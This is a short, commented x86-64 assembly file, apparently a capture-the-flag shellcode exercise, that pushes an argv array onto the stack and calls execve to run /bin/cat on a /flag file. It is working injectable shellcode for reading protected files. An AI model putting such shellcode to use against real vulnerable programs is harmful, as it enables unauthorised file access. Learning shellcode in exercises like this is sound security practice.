# This is execve(/bin/cat), but we use the stack to store the argv instead

.intel_syntax noprefix
.global _start      # Start program at _start

.text      # Start text section

cat_str:
    .asciz "/bin/cat"            # Declare a string /bin/cat. asciz null terms this

flag_str:
    .asciz "/flag"               # Declare a string /path. This is what we want to read

_start:

# Push ["/bin/cat", "/flag", NULL] onto the stack. Use $rsp to refer to this
mov rcx, 0
push rcx                # NULL

lea rcx, [rip + flag_str]       # /flag
push rcx

lea rcx, [rip + cat_str]         # /bin/cat
push rcx

# execve("/bin/cat", ["/bin/cat", "/flag", NULL], NULL)
# https://blog..org/posts/Linux_System_Call_Table_for_x86_64/ - Syscall table
mov rax, 59
lea rdi, [rip + cat_str]
mov rsi, rsp
mov rdx, 0

syscall

